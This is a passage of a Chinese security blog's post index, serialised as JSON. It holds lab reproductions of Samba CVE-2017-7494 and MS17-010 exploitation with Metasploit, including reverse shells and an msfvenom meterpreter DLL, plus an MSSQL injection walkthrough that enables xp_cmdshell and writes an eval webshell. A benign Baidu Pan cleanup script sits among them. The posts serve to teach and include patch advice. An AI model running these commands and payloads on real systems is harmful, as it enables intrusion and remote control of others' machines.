1.过滤T3协议 2.安装补丁 0x04 总结主要采用了phith0n提供的WebLogic利用环境进行对WebLogic漏洞的验证。包括有WebLogic弱口令获取WEBSHELL、SSRF漏洞利用和WebLogic反序列化漏洞的利用等。总结下来一共有这三个问题。1.对于WebLogic弱口令，如何去上传WEBSHELL2.对于SSRF漏洞，如何探测内网存活的主机以及开放的端口，并如何利用这些端口。3.对于反序列化漏洞，如何快速的找到WEB路径以及对应的物理路径。 0x05 参考[1]https://github.com/phith0n/vulhub/tree/master/weblogic[2]http://blog.csdn.net/chs007chs/article/details/52514888","tags":[{"name":"WebLogic漏洞","slug":"WebLogic漏洞","permalink":"https://fuping.site/tags/WebLogic%E6%BC%8F%E6%B4%9E/"},{"name":"SSRF","slug":"SSRF","permalink":"https://fuping.site/tags/SSRF/"},{"name":"WebLogic反序列化","slug":"WebLogic反序列化","permalink":"https://fuping.site/tags/WebLogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"Samba远程代码执行漏洞(CVE-2017-7494)复现过程","date":"2017-05-25T10:43:14.000Z","path":"2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/","text":"概述Samba是在Linux和UNIX系统上实现SMB协议的一个软件。2017年5月24日Samba发布了4.6.4版本，中间修复了一个严重的远程代码执行漏洞，漏洞编号CVE-2017-7494，漏洞影响了Samba 3.5.0 之后到4.6.4/4.5.10/4.4.14中间的所有版本。这里采用ubuntu-16.04.2 x64位为测试机。 复现过程环境的搭建靶机中默认未安装Samba，首先来安装Samba并进行配置。 1sudo apt install samba 安装成功，查看版本 修改Samba配置文件 1sudo gedit /etc/samba/smb.conf 在最底部添加如下内容 1234[fuping] #显示的共享文件夹名字path = /tmppublic = yeswriteable = yes 然后重启smbd服务 1sudo service smbd restart 至此，环境已经搭建成功。开始用Kail进行攻击。 攻击过程首先去下载利用的脚本。 12root@kali:~# cd /usr/share/metasploit-framework/modules/exploits/linux/sambaroot@kali:/usr/share/metasploit-framework/modules/exploits/linux/samba# wget https://raw.githubusercontent.com/hdm/metasploit-framework/0520d7cf76f8e5e654cb60f157772200c1b9e230/modules/exploits/linux/samba/is_known_pipename.rb -O is_known_pipename.rb 然后就是在Metasploit中加载并使用脚本，攻击过程如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112msf &gt; use exploit/linux/samba/is_known_pipenamemsf exploit(is_known_pipename) &gt; show optionsModule options (exploit/linux/samba/is_known_pipename): Name Current Setting Required Description ---- --------------- -------- ----------- RHOST yes The target address RPORT 445 yes The SMB service port (TCP) SMB_FOLDER no The directory to use within the writeable SMB share SMB_SHARE_BASE no The remote filesystem path correlating with the SMB share name SMB_SHARE_NAME no The name of the SMB share containing a writeable directoryExploit target: Id Name -- ---- 2 Linux x86msf exploit(is_known_pipename) &gt; show targetsExploit targets: Id Name -- ---- 0 Automatic 1 Linux ARM (LE) 2 Linux x86 3 Linux x86_64msf exploit(is_known_pipename) &gt; set RHOST 192.168.232.137RHOST =&gt; 192.168.232.137msf exploit(is_known_pipename) &gt; set target 3target =&gt; 3msf exploit(is_known_pipename) &gt; exploit[*] Started reverse TCP handler on 192.168.232.134:4444[*] 192.168.232.137:445 - Using location \\\\192.168.232.137\\fuping\\ for the path[*] 192.168.232.137:445 - Payload is stored in //192.168.232.137/fuping/ as gRoUnyzb.so[*] 192.168.232.137:445 - Trying location /volume1/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume1/fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume1/FUPING/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume1/Fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume2/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume2/fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume2/FUPING/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume2/Fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume3/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume3/fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume3/FUPING/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume3/Fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /shared/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /shared/fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /shared/FUPING/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /shared/Fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/FUPING/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/Fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/usb/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/usb/fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/usb/FUPING/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/usb/Fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /media/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /media/fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /media/FUPING/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /media/Fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/media/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/media/fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/media/FUPING/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/media/Fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /var/samba/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /var/samba/fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /var/samba/FUPING/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /var/samba/Fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /tmp/gRoUnyzb.so...[*] Command shell session 1 opened (192.168.232.134:4444 -&gt; 192.168.232.137:41392) at 2017-05-24 12:35:20 -0400iduid=65534(nobody) gid=0(root) groups=0(root),65534(nogroup)whoaminobodyifconfigdocker0 Link encap:Ethernet HWaddr 02:42:23:77:72:91 inet addr:172.17.0.1 Bcast:0.0.0.0 Mask:255.255.0.0 inet6 addr: fe80::42:23ff:fe77:7291/64 Scope:Link UP BROADCAST MULTICAST MTU:1500 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:2 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:0 (0.0 B) TX bytes:180 (180.0 B)ens33 Link encap:Ethernet HWaddr 00:0c:29:77:23:9e inet addr:192.168.232.137 Bcast:192.168.232.255 Mask:255.255.255.0 inet6 addr: fe80::7651:9ad0:80e5:c9c8/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:349052 errors:0 dropped:0 overruns:0 frame:0 TX packets:112974 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:419009840 (419.0 MB) TX bytes:8902292 (8.9 MB)lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:23329 errors:0 dropped:0 overruns:0 frame:0 TX packets:23329 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1 RX bytes:48010585 (48.0 MB) TX bytes:48010585 (48.0 MB) 需要填写目标地址和选择Target，我的是x64位系统，所以设置了target为3。 效果图 更新2017.05.26 对需要登陆的Smb进行验证脚本已经更新，集成在msf中，直接msfupdate即可。 1.修改Ubuntu中的Samba配置文件。 1sudo gedit /etc/samba/smb.conf 在[global]中添加：security = user修改底部的[fuping] 123[fuping] #显示的共享文件夹名字path = /tmpwriteable = yes 2.添加smb用户 12sudo useradd smbusersudo smbpasswd -a smbuser 3.开始攻击 12345678msf &gt; use exploit/linux/samba/is_known_pipename msf exploit(is_known_pipename) &gt; set SMBUSER smbuserSMBUSER =&gt; smbusermsf exploit(is_known_pipename) &gt; set SMBPASS smbuserSMBPASS =&gt; smbusermsf exploit(is_known_pipename) &gt; set RHOST 192.168.232.137RHOST =&gt; 192.168.232.137msf exploit(is_known_pipename) &gt; exploit 解决方案1.受影响的用户尽快下载最新的Samba版本手动更新。2.使用二进制分发包（RPM等方式）的用户立即进行yum，apt-get update等安全更新操作3.不打补丁的缓解策略：用户可以通过在smb.conf的[global]节点下增加“nt pipe support = no”选项，然后重新启动samba服务， 以此达到缓解该漏洞的效果。 参考[1]https://github.com/rapid7/metasploit-framework/pull/8450[2]http://bobao.360.cn/learning/detail/3900.html[3]https://securityonline.info/cve-2017-7494-samba-remote-code-execution-vulnerability/","tags":[{"name":"CVE-2017-7494","slug":"CVE-2017-7494","permalink":"https://fuping.site/tags/CVE-2017-7494/"},{"name":"Samba漏洞","slug":"Samba漏洞","permalink":"https://fuping.site/tags/Samba%E6%BC%8F%E6%B4%9E/"}]},{"title":"如何清除百度网盘重复文件","date":"2017-05-24T07:24:27.000Z","path":"2017/05/24/Clean-Duplicate-Files-OF-BaiDu-YunPan/","text":"0x00 前言百度网盘最近推出了一个垃圾文件清理功能，可以扫描重复的文件，就试了一下。扫描结果发现存在许多的重复文件，删除后空间可以再多一个T。就想删除一下，结果需要开通会员。于是就想着来实现一下如何快速删除网盘重复的文件。要实现这个功能，第一首先要知道重复的文件，第二就是对这些重复的文件进行删除了。 0x01 如何获取重复的文件这里以wap版为例。打开https://pan.baidu.com/wap/home 并抓包。可以看到一个Get请求 1https://pan.baidu.com/api/list?bdstoken=***********&amp;web=5&amp;app_id=250528&amp;logid=MTQ5NTYxMjU1OTQ1NDAuOTE2MjI3ODg0NjE5MTU0Ng==&amp;channel=chunlei&amp;clienttype=5&amp;order=time&amp;desc=1&amp;showempty=0&amp;page=1&amp;num=20&amp;dir=%2F 主要请求参数： 参数名 备注 bdstoken 网页源代码中有 loginid BASE64(时间戳+四位+.+16位数字)，固定值即可 page 页码 num 每页显示条数 dir 文件路径 order 排序的条件（固定时间排序即可） desc 升序降序（降序排列即可） 其他参数固定值即可返回内容为JSON 当遇到文件时，会返回文件的MD5和大小以及路径。 返回JSON中的主要内容说明只列举需要的字段 名称 含义 备注 isdir 是否为目录 文件为0，目录为1 size 文件大小 单位是字节 md5 文件的MD5值 可以用来判断文件是否重复 path 文件的路径 包含文件名 server_filename 文件名称 文件的名称 于是可以根据文件的MD5值来判断文件是否重复。首先将文件的主要信息（如MD5、大小、路径、名字）等信息保存到数据库中。然后根据MD5来判断是否重复，将重复的文件列出来，最后就是删除了。这里采用的开发语言是Java，Http请求采用了jsoup，处理Json采用了FastJson。数据库采用了MySQL。因为主要是为了分享思路，所以只贴部分代码了，知道怎么实现这个流程，代码写起来就简单许多了，实现的语言也就多样化了。具体实现步骤如下： 1.获取bdstoken访问https://pan.baidu.com/wap/home ，查看源代码搜索bdstoken即可看到。代码的实现如下： 123456789101112131415/** * 获取bdstoken * @return bdstoken */public static String getbdstoken()&#123; String bdstoken = null; Document doc = getDoc(Util.URL_HOME,getCookies()); String regex = \"\\\"bdstoken\\\":\\\"(.*)\\\",\\\"quota\"; Pattern pattern = Pattern.compile(regex); Matcher matcher = pattern.matcher(doc.html()); if(matcher.find())&#123; bdstoken = matcher.group(1); &#125; return bdstoken;&#125; Cookie只需要两个内容，一个是BDUSS，另一个是STOKEN。 1234567public static Map&lt;String,String&gt; getCookies()&#123; Map&lt;String,String&gt; cookies = new HashMap&lt;String, String&gt;(); cookies.put(\"BDUSS\", \"你的BDUSS\"); cookies.put(\"STOKEN\", \"你的STOKEN\"); return cookies;&#125; 2.递归获取所有的文件，并将文件的相关内容保存到数据库中获取每页文件内容时需要三个参数：当前页面、每页显示数量和路径。如下代码所示： 123456789101112131415/** * 列出当前页面文件 * @param page 页面 * @param num 显示数量 * @param dir 路径 * @return */public static List&lt;PanFile&gt; getFiles(int page,int num,String dir)&#123; String url = \"https://pan.baidu.com/api/list?bdstoken=\"+getbdstoken()+\"&amp;web=5&amp;app_id=250528&amp;logid=MTQ5NTQxMzA2Njg4ODAuODE0NzYwMjEyMzAzOTY5Mg==&amp;channel=chunlei&amp;clienttype=5&amp;order=time&amp;desc=1&amp;showempty=0&amp;page=\"+page+\"&amp;num=\"+num+\"&amp;dir=\"+dir; String jsonStr = getbody(url, getCookies()); JSONObject jsonObj = JSONObject.parseObject(jsonStr); JSONArray result = jsonObj.getJSONArray(\"list\"); List&lt;PanFile&gt; files= JSON.parseArray(result.toJSONString(),PanFile.class); return files;&#125; 递归遍历当前路径下所有文件代码如下： 123456789101112131415161718192021222324252627282930313233/** * 递归打印当前路径下所有文件，并入库 * @param str 路径 */public static void printFiles(String str)&#123; boolean flag=false; String dency[] = &#123;\"/C#资料/我的c#\",\"/12-19 Java Workplace\",\"/dumppp\",\"/myWEB\"&#125;;//白名单，针对其中的目录不遍历 for (String string : dency) &#123; if(str.trim().equals(string))&#123; flag = true; &#125; &#125; if(!flag)&#123; try &#123; str = URLEncoder.encode(str, \"utf-8\"); &#125; catch (UnsupportedEncodingException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; List&lt;PanFile&gt; files= UtilMethod.getFiles(1,2000,str); for (PanFile panFile : files) &#123; if(panFile.getIsdir()==1)&#123; printFiles(panFile.getPath()); &#125;else&#123; String fileName = panFile.getPath(); System.out.println(fileName+\"---size:\"+panFile.getSize()+\"--md5:\"+panFile.getMd5()); insertDB(panFile.getServerMtime(),panFile.getCategory(),panFile.getFsId(),panFile.getIsdir(), panFile.getServerCtime(),panFile.getLocalMtime(),panFile.getSize(),panFile.getMd5(), panFile.getPath(),panFile.getLocalCtime(),panFile.getServerFilename()); &#125; &#125; &#125;&#125; 效果如图所示 查看数据库中的文件信息 由于有些目录下面是代码，而且文件多有小，所以就不针对这些文件目录下的文件进行遍历。就采用了白名单的方式，对白名单中内容不遍历。由于某些路径中含有其他字符，导致找不到路径，使用采用了URL编码。为了方便，直接将page设置为1，num值换为2000（可以根据自己的文件多少来调节，最好大一些），一页就将所有的数据显示出来。插入数据库方法的代码比较简单，这里就省略了。 3.获取重复的大文件已经将文件的信息都存储在数据库中，然后根据数据库中文件的MD5来获取重复的文件。我这里只把大于500M的重复文件给列举出来。 1.获取大于500M的重复文件的MD5123456789101112131415161718192021222324252627282930/** * 获取大于500M的重复文件的MD5 * @return */public static List&lt;String&gt; setp1()&#123; List&lt;String&gt; ltMd5 = new ArrayList&lt;String&gt;(); String sql = \"select count(*),md5,server_filename from mmpan \" + \"where size &gt; 1024*1024*500 \" + \"group by md5 \" + \"HAVING COUNT(md5) &gt;1 \" + \"order by path\"; Connection conn = DBFactory.getConnection(); PreparedStatement pst = null; ResultSet rst = null; try &#123; pst = conn.prepareStatement(sql); rst = pst.executeQuery(); while(rst.next())&#123; ltMd5.add(rst.getString(\"md5\")); &#125; &#125; catch (SQLException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125;finally &#123; DBFactory.close(rst, pst, conn); &#125; return ltMd5; &#125; 2.根据步骤1获取文件的MD5值，获取最小path的长度1234567891011121314151617181920212223242526/** * 根据文件的MD5值，获取最小path的长度 * @param md5 * @return */public static int setp2(String md5)&#123; int length = -1; String sql = \"select min(LENGTH(path)) from mmpan where md5=?\"; Connection conn = DBFactory.getConnection(); PreparedStatement pst = null; ResultSet rst = null; try &#123; pst = conn.prepareStatement(sql); pst.setString(1, md5); rst = pst.executeQuery(); if(rst.next())&#123; length = rst.getInt(1); &#125; &#125; catch (SQLException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125;finally &#123; DBFactory.close(rst, pst, conn); &#125; return length;&#125; 3.根据MD5和最短路径，列出大于最短路径的文件12345678910111213141516171819202122232425262728/** * 根据MD5和最短路径，列出大于最短路径的文件 * @param md5 * @param length * @return */public static List&lt;String&gt; setp3(String md5,int length)&#123; List&lt;String&gt; ltPath = new ArrayList&lt;String&gt;(); String sql = \"select path from mmpan where md5=? and LENGTH(path) &gt; ?\"; Connection conn = DBFactory.getConnection(); PreparedStatement pst = null; ResultSet rst = null; try &#123; pst = conn.prepareStatement(sql); pst.setString(1, md5); pst.setInt(2, length); rst = pst.executeQuery(); while(rst.next())&#123; ltPath.add(rst.getString(1)); &#125; &#125; catch (SQLException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125;finally &#123; DBFactory.close(rst, pst, conn); &#125; return ltPath;&#125; 获取这个列表是为了将其删除 将以上三步综合起来，如下 123456789101112131415161718/** * 获取指定条件下文件路径 * @return */public static List&lt;String&gt; getPaths()&#123; List&lt;String&gt; ltPath = null; List&lt;String&gt; ltPaths = new ArrayList&lt;String&gt;(); List&lt;String&gt; lt = UtilMethod.setp1(); int length = -1 ; for (String md5 : lt) &#123; length = UtilMethod.setp2(md5); ltPath = UtilMethod.setp3(md5, length); for (String path : ltPath) &#123; ltPaths.add(path); &#125; &#125; return ltPaths;&#125; 此时列表中的文件都是为了删除的文件的路径。 0x02 如何实现删除文件删除文件时抓包，发现如下请求 12345678POST /api/filemanager?opera=delete&amp;async=2&amp;channel=chunlei&amp;web=1&amp;app_id=250528&amp;bdstoken=****&amp;logid=MTQ5NTU0ODk4Mjk2MjAuMzgyNjczNDYzNDM0MTU0NA==&amp;clienttype=0 HTTP/1.1Host: pan.baidu.comX-Requested-With: XMLHttpRequestCookie: CookieConnection: closeContent-Length: 61filelist=%5B%22%2F000%2F%E7%A4%BE%E5%B7%A5%E5%BA%93.rar%22%5D 所需参数有bdstoken和删除文件的列表 我们首先将需要删除文件拼接起来 12345678910111213141516171819/** * 根据文件路径拼接filelist * @return */public static String getFileList()&#123; List&lt;String&gt; ltPath = UtilMethod.getPaths(); StringBuilder sb = new StringBuilder(); sb.append(\"[\"); for (int i = 0; i &lt; 3; i++) &#123; //System.out.println(ltPath.get(i)); sb.append(\"\\\"\"); sb.append(ltPath.get(i)); sb.append(\"\\\"\"); sb.append(\",\"); &#125; sb.append(\"***]\"); return sb.toString().replace(\",***\", \"\");&#125; 为了测试，我仅仅先删除三条进行测试。如果需要全部删除，将3换成ltPath.size()即可。 删除文件的代码如下： 123456789101112131415/** * 根据文件列表删除文件 * @param filelist * @return */public static String delRequest(String filelist)&#123; String url = \"https://pan.baidu.com/api/filemanager?opera=delete&amp;async=2&amp;channel=chunlei&amp;web=1&amp;app_id=250528&amp;bdstoken=\"+getbdstoken()+\"&amp;logid=MTQ5NTU0ODk4Mjk2MjAuMzgyNjczNDYzNDM0MTU0NA==&amp;clienttype=0\"; String result = \"删除失败,请重试\"; String jsonStr = getbody(url, getCookies(),filelist); JSONObject jsonObj = JSONObject.parseObject(jsonStr); if(jsonObj.get(\"errno\").toString().equals(\"0\"))&#123; result = \"文件删除成功，删除成功的文件为\"+filelist; &#125; return result;&#125; 测试删除的代码如下： 123456@Testpublic void testdelFile()&#123; String fileList = UtilMethod.getFileList(); System.out.println(UtilMethod.delRequest(fileList));&#125; 附上效果图 大功告成。不过删除的时候要注意一下，删除错误的话可以去回收站查看，然后再恢复。不要急于清除回收站。代码仅供参考。代码地址：代码Python的实现脚本https://github.com/fupinglee/MyPython/blob/master/baidu/BDPandel.py 。python代码删除文件效果图 还有一种最快的实现方法就是开个会员o(╯□╰)o。 0x03 总结本文没有什么大的知识点，都是常用的内容拼接在了一起。主要用到了三方面的内容：1.如何模拟网络请求抓取数据。这里采用了Java代码，Http请求采用了Jsoup。2.JSON解析，使用了FastJSON来实现3.递归遍历的实现 Python的实现也就是请求Http和数据库的操作。使用Python时要多注意数据类型和编码的转换。","tags":[{"name":"百度网盘","slug":"百度网盘","permalink":"https://fuping.site/tags/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/"},{"name":"快速清除","slug":"快速清除","permalink":"https://fuping.site/tags/%E5%BF%AB%E9%80%9F%E6%B8%85%E9%99%A4/"},{"name":"Java代码","slug":"Java代码","permalink":"https://fuping.site/tags/Java%E4%BB%A3%E7%A0%81/"},{"name":"Python脚本","slug":"Python脚本","permalink":"https://fuping.site/tags/Python%E8%84%9A%E6%9C%AC/"}]},{"title":"MSSQL DBA权限获取WEBSHELL的过程","date":"2017-05-16T05:27:26.000Z","path":"2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/","text":"前言本文主要通过一个案例来演示一下当MSSQL是DBA权限，且不知道路径的时候如何去获取WEBSHELL。当然这种方式对站库分离的无效。我测试的环境是在Win7 64位下，数据库是SQLServer 2000，IIS版本是7.5，程序是采用风讯的CMS。后台登录后有多处注入，因为这里是演示用注入获取WEBSHELL，因此就不考虑后台上传的情况了，只是用注入来实现。 过程首先找到一个如下的注入点： 1http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1' and 1=user;-- 通过SQLMAP可以查看到是DBA权限 创建临时表 1http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1';CREATE TABLE tt_tmp (tmp1 varchar(8000));-- 在WINDOWS下查找文件用如下命令： 1for /r 目录名:\\ %i in (匹配模式) do @echo %i 例如在C盘下搜索NewsList.aspx，可以使用for /r c:\\ %i in (Newslist*.aspx) do @echo %i或者for /r c:\\ %i in (Newslist.aspx*) do @echo %i 使用for /r c:\\ %i in (Newslist*.aspx) do @echo %i的搜索结果 一定要在匹配模式里面加上一个*号，不然搜索出来的是全部的目录，后面拼接了你搜索的内容。使用for /r c:\\ %i in (Newslist.aspx) do @echo %i的搜索结果 用xp_cmdshell执行查找文件的命令，并将搜索的结果插入到临时表中 1http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1';insert into tt_tmp(tmp1) exec master..xp_cmdshell 'for /r c:\\ %i in (Newslist*.aspx) do @echo %i ';-- 如果无法执行xp_cmdshell，并提示如下错误SQL Server阻止了对组件‘xp_cmdshell’的过程‘sys.xp_cmdshell’的访问。因为此组件已作为此服务嚣安全配置的一部分而被关闭。系统管理员可以通过使用sp_configure启用‘xp_cmdshell’。 可以使用如下命令来启用xp_cmdshell 1234;EXEC sp_configure 'show advanced options',1;//允许修改高级参数RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1; //打开xp_cmdshell扩展RECONFIGURE;-- 然后再次执行搜索命令。 在执行上述搜索和插入过程后，可以使用&#39; and (select(*) from tt_tmp)&gt;1页面返回是否正常来判断是否有搜索结果。当没有找到的话，select(*) from tt_tmp的结果为1，否则大于1。如果没有的话，就换目录，可以试试其他盘符，如&#39;;insert into tt_tmp(tmp1) exec master..xp_cmdshell &#39;for /r d:\\ %i in (Newslist*.aspx) do @echo %i &#39;;--。也可以使用sqlmap来查看条数。 可以用报错将表内容给显示出来 1http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=2' and 1=(select top 1 tmp1 from tt_tmp)and 'a'='a 继续爆 1http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=2' and 1=(select top 1 tmp1 from tt_tmp where tmp1 not in ('c:\\inetpub\\wwwroot\\manage\\news\\NewsList.aspx '))and 'a'='a 也可以用sqlmap直接将表中数据读取出来 然后根据导出结果的路径来判断是否可能为WEB目录。然后写入一个测试文件，看是否可以访问来进一步证实结果。 这里在根目录写了一个txt文件，写别的目录怕因为没有权限而无法访问。 1http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1';exec master..xp_cmdshell 'echo test &gt;c:\\\\WWW\\\\2333.txt';-- 然后访问http://192.168.232.138:81/2333.txt 成功访问，然后就是写一句话 1http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1';exec master..xp_cmdshell 'echo ^&lt;%@ Page Language=\"Jscript\"%^&gt;^&lt;%eval(Request.Item[\"pass\"],\"unsafe\");%^&gt; &gt; c:\\\\WWW\\\\233.aspx' ;-- 成功写入。然后就是进一步的操作了，这里就不概述了。 DOS命令将文件写入文本中时，遇到&lt;&gt;应在前面加上^。 总结这里一共有三个小的知识点:1.sa用户如何开启xp_cmdshell 1234EXEC sp_configure 'show advanced options',1;//允许修改高级参数RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1; //打开xp_cmdshell扩展RECONFIGURE; 2.Windows下利用dos如何搜索文件 12for /r c:\\ %i in (Newslist*.aspx) do @echo %ifor /r c:\\ %i in (Newslist.aspx*) do @echo %i 3.dos命令下写文件遇到&lt;&gt;如何处理 1echo ^&lt;^&gt; &gt; 123.txt 参考[1]Windows命令行(cmd)下快速查找文件(类似Linux下find命令) [2]技术分享：MSSQL注入xp_cmdshell","tags":[{"name":"MSSQL","slug":"MSSQL","permalink":"https://fuping.site/tags/MSSQL/"},{"name":"WEBSHELL","slug":"WEBSHELL","permalink":"https://fuping.site/tags/WEBSHELL/"},{"name":"ASPX","slug":"ASPX","permalink":"https://fuping.site/tags/ASPX/"}]},{"title":"MS17-010漏洞检测与内网穿透技术的应用","date":"2017-04-21T09:20:02.000Z","path":"2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/","text":"0x00 前言本文主要介绍一下MSF模块的下载、使用，以及当攻击机处于内网，而目标机也处于内网的解决方法。这里借助MS17-010漏洞来具体讲解一下，并没有新的知识点，可以为刚入门的新手抛砖引玉，提供一条解决问题的思路，同时也记录一下过程，加强记忆。主要分为两个知识点，一是SMB漏洞的批量检测，二是内网穿透技术。 首先是环境的搭建，具体如下表所示： | 主机 | IP |备注||——–|——–|| Kali 64位 | 192.168.232.134 |攻击机| Windows XP 32位 | 192.168.232.128 |安装了python2.6，下载有方程式利用工具包（主要为Windows目录下的工具）| Window2008 R2 64位 | 10.50.2.62 |靶机，存在MS17-010漏洞，并可以访问外网 0x01 SMB漏洞批量检测1.扫描脚本的下载和加载由于Metasploit还没有更新MS17-010检测的模块，所以要去exploit-db下载，并在MSF中加载。 12root@kali:~# cd /usr/share/metasploit-framework/modules/auxiliary/scanner/smbroot@kali:/usr/share/metasploit-framework/modules/auxiliary/scanner/smb# wget https://www.exploit-db.com/download/41891 -O smb_ms_17_010.rb 启动Metasploit，模块会自动加载，或者使用命令reload_all重新加载所有模块。 2.漏洞扫描的使用方法选择使用smb_ms_17_010模块，并查看使用命令。 12msf &gt; use auxiliary/scanner/smb/smb_ms_17_010msf auxiliary(smb_ms_17_010) &gt; show options 所必须的参数有三个，对于无需登录的SMB，我们只需设置一下扫描的IP段、线程并运行即可开始扫描。 12345msf auxiliary(smb_ms_17_010) &gt; set RHOSTS 10.50.2.1-255RHOSTS =&gt; 10.50.2.1-255msf auxiliary(smb_ms_17_010) &gt; set THREADS 10THREADS =&gt; 10msf auxiliary(smb_ms_17_010) &gt; run 出现黄色警告的表示可能存在，需要进一步验证。为了方便将存在漏洞的IP列出来，写了一个简单的Python脚本。 1234567891011import reif __name__ == '__main__': f = open(\"smb.txt\", mode='r', buffering=1) while(True): line = f.readline() if line : if \"likely\" in line: print line.split(' ')[1].split(':')[0] else: break 提取出的IP如下所示： 12345678910111213.....10.50.2.5210.50.2.6210.50.2.6510.50.2.6110.50.2.6310.50.2.6410.50.2.7610.50.2.6910.50.2.7710.50.2.7810.50.2.79.... 有了存在漏洞的地址，接下来将开始对其进行验证，以10.50.2.62为例。由于Kali在虚拟机，宿主机IP为2.0..，目标机在10.50.2.*。相当于需要从内网到另一个内网， 选择采用了ngrok进行tcp的端口转发来实现内网的穿透。 0x02 内网穿透这里采用了www.ngrok.cc平台进行演示，类似这样的平台有很多，例如natapp.cn等。注册并开通隧道，如图所示。 下载对应的客户端，下载地址为：https://www.ngrok.cc/#down-client ，选择与系统对应的软件。我这里Kali为64位的，下载和使用命令如下： 12345root@kali:~/Downloads# wget hls.ctopus.com/sunny/linux_amd64.ziproot@kali:~/Downloads# unzip linux_amd64.ziproot@kali:~/Downloads# cd linux_amd64/root@kali:~/Downloads/linux_amd64# lsroot@kali:~/Downloads/linux_amd64# ./sunny clientid 隧道ID 出现下图的界面表示运行成功。 使用如下命令生成用于监听的dll文件。监听的IP为server.ngrok.cc的地址，端口为开通隧道时填写的远程端口。 1root@kali:~/Documents# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=47.90.92.56 LPORT=6266 -f dll &gt; got.dll 然后在Kali上设置监听本机的IP和端口，也就是在开通隧道时填写的本地端口。 12345use exploit/multi/handlerset LHOST 192.168.232.134set LPORT 5555set PAYLOAD windows/x64/meterpreter/reverse_tcpmsf exploit(handler) &gt; exploit 由于关于Eternalblue利用方法有很多教程了，这里就不详细说明了，如图所示。攻击成功时查看ngrok客户端发现有一个连接。而且Kali上也生成了一个meterpreter会话。之后的操作就很简单了，可以添加用户等等。最后远程登录成功如下图所示。使用natapp也是可以的。 0x03 总结本文主要以MS17-010为例，讲解了如何下载和利用Metasploit中没有的模块，以及如何解决内网到内网的穿透的问题，当然解决的方法还有很多，这里就不再介绍了。 没有什么新的知识，怕忘记所以记录一下~~ 0x04 